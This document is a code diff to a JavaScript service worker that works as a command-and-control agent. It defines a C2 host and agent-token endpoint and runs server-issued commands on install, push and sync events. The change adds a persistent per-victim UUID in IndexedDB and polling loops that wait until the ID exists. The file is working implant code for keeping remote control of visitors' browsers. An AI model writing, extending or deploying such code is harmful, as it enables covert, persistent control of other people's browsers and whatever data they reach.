@@ -2,10 +2,35 @@ C2_HOST = '//{{host}}';
 C2_SERVER = C2_HOST + '/agent/{{agent_token}}';
 
 var counter = 0;
-var agentID = "{{agentID}}";
 
-function activateModules(){
+function create_UUID(){
+  var datetime = new Date().getTime();
+  var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = (datetime + Math.random() * 16) % 16 | 0;
+    datetime = Math.floor(datetime / 16);
+    return (c == 'x' ? r : (r&0x3 | 0x8)).toString(16);
+  });
+  return uuid;
+}
+
+var agentID = null;
+
+function setAgentID(){
+  new Promise((res, rej) => {
+    ReadIDB("agentID", rej);
+  }).catch(function(p){
+    if(p == undefined){
+      agentID = create_UUID();
+      WriteIDB("agentID", agentID);
+    }else{
+      agentID = p; // previous value
+    }
+  });
+}
+
+function init(){
   WriteIDB("active", 1);
+  setAgentID();
   new Promise((res, rej) => {
     ReadIDB("extra_modules", rej);
   }).catch(function(m){
@@ -31,7 +56,7 @@ function activateModules(){
 }
 
 self.addEventListener('sync', function(event){
-  activateModules();
+  init();
   if (event.tag == 'outbox'){
   	counter++;
     fetch("/Sync1_Activated");
@@ -108,6 +133,12 @@ function urlB64ToUint8Array(base64String){
 }
 
 function postPushReg(sub){
+  if(agentID === null){
+    setTimeout(function(){
+      postPushReg(sub)
+    }, 100);
+    return;
+  }
   var rawKey = sub.getKey ? sub.getKey('p256dh') : '';
   var key = rawKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey))) : '';
   var rawAuthSecret = sub.getKey ? sub.getKey('auth') : '';
@@ -121,7 +152,7 @@ function postPushReg(sub){
 }
 
 self.addEventListener('push', function(event){
-  activateModules();
+  init();
   event.waitUntil(new Promise((resolve, reject) => {
   	SI("push"); 
   }));
@@ -140,9 +171,17 @@ function reg(){
  });
 }
 
+function install(){
+  if(agentID === null){
+    setTimeout(install, 100);
+  }else{
+    commandAndExecute("install");
+  }
+}
+
 self.addEventListener('install', function(event){
   console.log("SW installed -from sw.js");
-  commandAndExecute("install");
+  install();
   indexedDB.deleteDatabase("swdb");
 });
 
@@ -249,7 +288,10 @@ function commandAndExecute(Meta){
 }
 
 function SI(Meta){
-	setTimeout(function(){ 
+	setTimeout(function(){
+    console.log("SI: " + agentID);
+    if(agentID === null) // UUID not yet set, hold on...
+      return;
 	  commandAndExecute(Meta);
     SI(Meta);
   }, 500);
